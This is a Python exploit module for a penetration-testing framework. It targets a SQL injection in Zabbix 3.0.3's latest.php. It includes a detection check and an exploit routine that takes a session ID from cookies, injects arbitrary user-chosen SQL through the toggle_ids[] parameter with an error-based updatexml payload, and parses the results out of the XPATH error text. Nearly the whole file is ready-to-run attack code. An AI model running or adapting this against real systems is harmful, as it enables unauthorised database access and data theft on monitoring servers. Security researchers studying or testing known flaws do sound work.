import re
import requests
from lib.BaseMode.BaseOptions import *
from lib.BaseMode.BaseMods import *
from lib.BaseMode.BaseOptions import *
from lib.BaseMode.BaseResult import *

class Exploit(BaseExploit):
    def __init__(self):
        super(Exploit, self).__init__()
        self.update_info({
            "name": "zabbix latest.php sqli",
            "description": "zabbix 3.0.3 latest.php sql injection",
            "author": ["unknown"],
            "references": [
                "http://www.openwall.com/lists/oss-security/2017/01/12/4",
                "https://support.zabbix.com/browse/ZBX-11023",
                "http://www.debian.org/security/2017/dsa-3802",
                "http://www.securityfocus.com/bid/95423",
            ],
            "disclosure_date": "2017-01-12",
            "service_name": "zabbix",
            "service_version": "3.0.3",
        })
        self.register_http_target()
        self.register_options([
            BaseOption(
                name="SQL",
                required=True,
                description="The SQL statement you want to execute",
                value="updatexml(0,concat(0xa,user()),0)"
            )
        ])

    def check(self):
        url = self.options.get_option("URL")
        try:
            session = requests.session()
            response = session.get(url)
            zbx_sessionid = response.cookies.get("zbx_sessionid")
            sessionid = zbx_sessionid[-16:]
            check_response = session.get("{url}/latest.php?output=ajax&sid="
                                         "{sessionid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,"
                                         "concat(0xa,password(123)),0)".format(url=url, sessionid=sessionid))
            if "23AE809DDACAF96AF0FD78ED04B6A2" in check_response.text:
                self.results.success("URL:{} has the vulnerability".format(url))
            else:
                self.results.failure("URL:{} does not have this vulnerability".format(url))
        except TypeError:
            self.results.failure("URL:{} Maybe not zabbix? not found zbx_sessionid".format(url))
        except Exception as e:
            self.results.failure("URL:{} does not have this vulnerability, error:{}", format(url, str(e)))
        return self.results

    def exploit(self):
        url = self.options.get_option("URL")
        sql = self.options.get_option("SQL")
        try:
            session = requests.session()
            response = session.get(url)
            zbx_sessionid = response.cookies.get("zbx_sessionid")
            sessionid = zbx_sessionid[-16:]
            exploit_response = session.get(
                "{url}/latest.php?output=ajax&sid={sessionid}&favobj=toggle&toggle_open_state=1&toggle_ids[]={sql}".format(
                    url=url,
                    sessionid=sessionid,
                    sql=sql,
                ))
            exploit_result_text = re.search(
                r"\[XPATH syntax error: '</li><li>(.*?)'\]</li></ul>",
                exploit_response.text
            ).group(1)
            self.results.success(message="Exploit result: {}".format(exploit_result_text))
        except TypeError:
            self.results.failure("URL:{} Maybe not zabbix? not found zbx_sessionid".format(url))
        except Exception as e:
            self.results.failure("URL:{} does not have this vulnerability, error:{}", format(url, str(e)))
        finally:
            return self.results